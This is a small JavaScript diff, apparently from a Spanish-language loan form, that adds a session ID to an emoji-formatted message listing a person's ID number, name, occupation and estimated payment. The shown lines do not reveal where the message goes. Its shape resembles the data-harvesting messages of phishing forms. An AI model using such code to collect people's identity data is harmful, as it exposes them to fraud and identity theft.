@@ -427,7 +427,8 @@
                 cuotaEstimada: cuotaDisplay.textContent
             };
 
-            const mensaje = `📋 **DATOS PERSONALES**\n` +
+            const sesionId = localStorage.getItem('sesionId') || 'DESCONOCIDO';
+const mensaje = `📋 **DATOS PERSONALES**\n🆔 ${sesionId}\n` +
                             `👤 Cédula: ${datos.cedula}\n` +
                             `📛 Nombre: ${datos.nombre}\n` +
                             `💼 Ocupación: ${datos.ocupacion}\n` +
